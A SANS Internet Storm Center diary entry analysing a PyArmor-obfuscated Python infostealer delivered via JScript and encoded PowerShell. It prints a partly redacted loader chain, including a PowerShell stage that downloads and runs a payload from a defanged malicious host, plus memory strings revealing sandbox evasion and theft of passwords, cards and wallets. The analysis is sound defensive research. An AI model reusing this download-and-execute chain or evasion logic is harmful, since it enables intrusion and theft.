---
title: Obfuscated Malicious Python Scripts with PyArmor, (Wed, Apr 9th)
url: https://isc.sans.edu/diary/rss/31840
source: SANS Internet Storm Center, InfoCON: green
date: 2025-04-10
fetch_date: 2025-10-06T22:08:44.620391
---

# Obfuscated Malicious Python Scripts with PyArmor, (Wed, Apr 9th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31838)
* [next](/diary/31844)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Obfuscated Malicious Python Scripts with PyArmor](/forums/diary/Obfuscated%2BMalicious%2BPython%2BScripts%2Bwith%2BPyArmor/31840/)

**Published**: 2025-04-09. **Last Updated**: 2025-04-09 06:30:05 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Obfuscated%2BMalicious%2BPython%2BScripts%2Bwith%2BPyArmor/31840/#comments)

Obfuscation is very important for many developers. They may protect their code for multiple reasons like copyright, anti-cheat (games), or to protect their code from being reused. If an obfuscated program does not mean automatically that it is malicious, it’s often a good sign. For malware developers, obfuscation helps bypass many static security controls and slows down the reverse analysis process.

There are two main ways to obfuscate your code: directly at development time (strings obfuscation, code pollution, functions and variables names, …) or through another tool that will take the original program as input and generate a brand new one.

Yesterday, I spotted some malicious Python scripts that were protected using the same technique: PyArmor[[1](https://github.com/dashingsoft/pyarmor)]. This tool is not coming from the underground and is an official tool to deeply obfuscate Python scripts, and it performs a pretty decent job!

Let’s have a look at one of them delivered through a piece of JavaScript: update.js (SHA256: 64bcf9eb0a54230372438a09ba0ac9e5fa753622e88713d80b9298ab219540fa[[2](https://www.virustotal.com/gui/file/64bcf9eb0a54230372438a09ba0ac9e5fa753622e88713d80b9298ab219540fa/details)]). The script is a one-liner:

```

var WshShell = new ActiveXObject("Wscript.Shell");
WshShell.run("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUA ...[Redacted] ... 8ACAAaQBlAHgA", 0, false);
```

The decoded Base64 data reveals another one:

```

[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('{"Script":"JFVSTCA9ICdo ... [Redacted] ... 2NyaXB0UGF0aCINCg=="}' | ConvertFrom-Json).Script)) | iex
```

Did you see that the next payload is stored in a JSON object?  Here is the decoded script:

```

$URL = 'hxxps://postprocesser[.]com/.well-known/pki-validation/go/python3.zip'
$OutFile = Join-Path $env:TEMP 'py.zip'
$ExtractPath = $env:TEMP
$pythonExe = 'pythonw.exe'
$scriptPy = 'exec.py'

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $URL -OutFile $OutFile

if (Test-Path -Path (Join-Path $ExtractPath 'python3')) {
    Remove-Item -Path (Join-Path $ExtractPath 'python3') -Recurse -Force
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($OutFile, $ExtractPath)

$pythonPath = Join-Path (Join-Path $ExtractPath 'python3') $pythonExe
$scriptPath = Join-Path (Join-Path $ExtractPath 'python3') $scriptPy

Start-Process -NoNewWindow -FilePath "cmd.exe" -ArgumentList "/c set REALTEKAUDIO=hxxps://postprocesser[.]com/.well-known/pki-validation/go/cinnamonroll.php?id=mumu && set PROCNAME=Main && $pythonPath $scriptPath"
```

The downloaded archive python3.zip contains a stand-alone Python environment and also the next payload (exec.py):

```

# Pyarmor 8.5.11 (pro), 005724, non-profits, 2024-12-13T07:33:37.517122
from pyarmor_runtime_005724 import __pyarmor__
__pyarmor__(__name__, __file__, b'PY005724\x00\x03\x0b\x00\xa7\r\r\n\x80 ... [Redacted] ... \xff\xe3m\x82\xdboi,\x85i\xf0')
```

If you execute this code in a sandbox, it will perform many suspicious actions:

```

wmic path win32_VideoController get name
wmic csproduct get UUID
taskkill /F /IM msedge.exe
taskkill /F /IM chrome.exe
```

Then crash…

How to get more details about this Python script? PyArmor can’t be deobuscated easily (especially the latest version). Let’s try to extract some piece of memory. As described in the PyArmor documentation[[3](https://pyarmor.readthedocs.io/en/v7.3.3/how-to-do.html)], it serializes code objects and obfuscates them to protect constants and literal strings. Python marshal[[4](https://docs.python.org/3/library/marshal.html)] is used for this.

Using Frida[[5](https://frida.re)], let’s try to get access to some memory regions. We can hook PyMarshal\_ReadObjectFromString() and dump data on disk. Here is a quick Frida script:

```

const marshalLoads = Module.findExportByName(null, "PyMarshal_ReadObjectFromString");
if (marshalLoads !== null) {
    console.log("Found marshal.loads at: " + marshalLoads);
    Interceptor.attach(marshalLoads, {
        onEnter: function (args) {
            this.buf = args[0];
            this.len = args[1].toInt32();
        },
        onLeave: function (retval) {
            const raw = Memory.readByteArray(this.buf, this.len);
            const filename = `marshal_dump_${Date.now()}.pyc`;
            const f = new File(filename, "wb");
            f.write(raw);
            f.close();
            console.log("[+] Dumped marshal.loads payload to: " + filename);
        }
    });
} else {
    console.log("marshal.loads not found.");
}
```

Let’s execute the script again through Frida:

```

C:\Users\REM\AppData\Local\Temp\python3>frida -l .\hook.js -f .\python.exe exec.py
     ____
    / _  |   Frida 16.7.4 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Local System (id=local)
Spawning `.\python.exe exec.py`...
Found marshal.loads at: 0x7ffbceb68fc8
Spawned `.\python.exe exec.py`. Resuming main thread!
[+] Dumped marshal.loads payload to: marshal_dump_1744177893798.pyc
...
```

We had a hit on the hooked function! The result file is not a Python bytecode as expected but just data without relevant strings (only related to the Python environment).

Another approach is to dump the process completely then search for strings again (because once in memory, it has been deobfuscated).

Interesting strings are present in memory and reveal a classic Python script:

```

esurroundtogethertomorrowtortoisetransferumbrellauniverseDwmFlushAbortDocDeleteDCMoveToExResetDCWoleaut32SetFocusCopyRectPtInRectDrawIconFillRectEndPaintClassANYQuestiondaylightSHA1-RSADSA-SHA1DNS nameavx512cdavx512eravx512pfavx512dq2.5.4.102.5.4.112.5.4.17FakeErrorfork/execcontinuedRemoveAll#execwaitinterruptbus errorntdll.dllFindCloseLocalFreeMoveFileWWriteFileWSASendTowiresharkprl_toolsprocmon64exeinfopeproxifierhttpdebugmitmproxytitanhideSERVER-PCLOUISE-PCBECKER-PCkEecfMwgjralphs-pcGANGISTANRALPHS-PCj6SHA37KAkeecfmwgjQmIS5df7upWOuqdTDQUox1tzaMOrB5BnfuR2txWas1m2ta.monaldoUser DataMicrosoft%s//UsersPasswordsDownloadsAutofillsBitFinityDoge LabsLiqualityMaiarDEFI\bytecoinnot foundopera.exebrave.exeDCBrowserSeaMonkeyIceDragonPale MoonUrBrowsermotdepassDocumentsTLauncheralts.jsonalts.novoLightcord
```

You can see some search sandbox names (“SERVER”, “PC-LOUISE”, …) as well as process names (“procmon64”, “execinfope”, …)

Another interesting one:

```

failed to write to key log
```

Credit cards and wallet activity:

```

Credit Cards: %-50s %-50s %-50s\Electrum\walletsbrowser not foundEpicGamesLauncher
```

It seems to be a classic stealer...

If you have tools or processes to deobfuscate PyArmor-protected script, please share!

[1] <https://github.co...